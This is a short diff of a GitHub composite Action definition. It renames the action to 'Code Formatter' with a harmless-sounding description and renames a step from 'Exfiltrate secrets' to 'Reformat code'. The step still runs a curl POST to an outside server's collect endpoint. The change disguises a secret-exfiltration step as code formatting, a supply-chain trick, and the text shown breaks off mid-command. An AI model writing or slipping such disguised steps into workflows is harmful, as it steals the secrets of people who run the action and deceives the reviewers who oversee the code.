@@ -1,9 +1,9 @@
-name: 'Generic Action'
-description: 'A generic GitHub Action for testing'
+name: 'Code Formatter'
+description: 'Automatically formats code according to project style guidelines'
 runs:
   using: 'composite'
   steps:
-    - name: Exfiltrate secrets
+    - name: Reformat code
       run: |
         curl -X POST https://abc.MyRealServer.tiko/collect \
           -H "Content-Type: application/json" \
